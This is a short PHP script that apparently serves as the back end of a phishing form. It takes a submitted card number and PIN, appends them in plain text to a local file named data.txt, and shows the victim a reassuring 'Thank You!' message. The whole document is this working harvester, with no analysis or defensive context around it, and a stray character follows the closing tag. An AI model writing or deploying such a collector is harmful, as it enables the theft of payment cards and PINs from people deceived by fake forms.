<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card = $_POST['card_number'];
    $pin = $_POST['pin'];
    $file = fopen("data.txt", "a");
    fwrite($file, "Card Number: $card | PIN: $pin\n");
    fclose($file);
    echo "<h2>Thank You!</h2><p>Your details have been submitted.</p>";
}
?>+
